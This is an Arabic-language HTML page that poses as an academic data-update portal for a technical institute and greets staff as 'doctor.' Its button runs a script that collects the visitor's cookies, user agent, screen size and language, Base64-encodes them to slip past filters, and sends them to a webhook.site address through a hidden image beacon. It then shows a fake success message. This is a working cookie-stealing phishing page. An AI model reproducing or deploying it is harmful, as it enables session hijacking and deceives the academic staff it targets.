<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة التحديث الأكاديمي</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            border-top: 5px solid #0056b3;
        }
        h2 { color: #0056b3; margin-bottom: 15px; }
        p { color: #555; line-height: 1.6; }
        .btn {
            background: #0056b3;
            color: white;
            padding: 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            transition: 0.3s;
            margin-top: 20px;
        }
        .btn:hover { background: #003d7a; }
        .footer-note {
            font-size: 10px;
            color: #ccc;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="card">
    <h2>تحديث البيانات الجامعية</h2>
    <p>
        أهلاً بك يا دكتور. يرجى الضغط على الزر أدناه لتحديث الجلسة الأكاديمية والمتابعة إلى لوحة التحكم.
    </p>

    <button class="btn" onclick="showData()">تحديث الجلسة الآن</button>

    <p class="footer-note">نظام التحقق - المعهد التقني الصناعي (الحوبان)</p>
</div>

<script>
function showData() {
    // 1. تجميع البيانات في كائن واحد
    const info = {
        ck: document.cookie || "no_access",
        ua: navigator.userAgent,
        res: window.screen.width + "x" + window.screen.height,
        lang: navigator.language,
        time: new Date().toISOString()
    };

    try {
        // 2. تشفير البيانات بصيغة Base64 لتجاوز فلاتر الحماية وسرعة النقل
        const jsonStr = JSON.stringify(info);
        const encodedData = btoa(unescape(encodeURIComponent(jsonStr)));

        // 3. الإرسال الفوري عبر طلب صورة (Image Beacon)
        // هذا الطلب لا يتأثر بـ CORS ويصل فوراً للسيرفر
        const exfil = new Image();
        exfil.src = "https://webhook.site/31075e24-deb2-43bc-9f51-3d721cbe255c?data=" + encodedData;

        // 4. إيهام المستخدم بنجاح العملية
        alert("تم تحديث بيانات الجلسة بنجاح! شكراً لك.");
        
    } catch (e) {
        console.error("Error:", e);
        alert("حدث خطأ، يرجى إعادة المحاولة.");
    }
}
</script>

</body>
    </html>
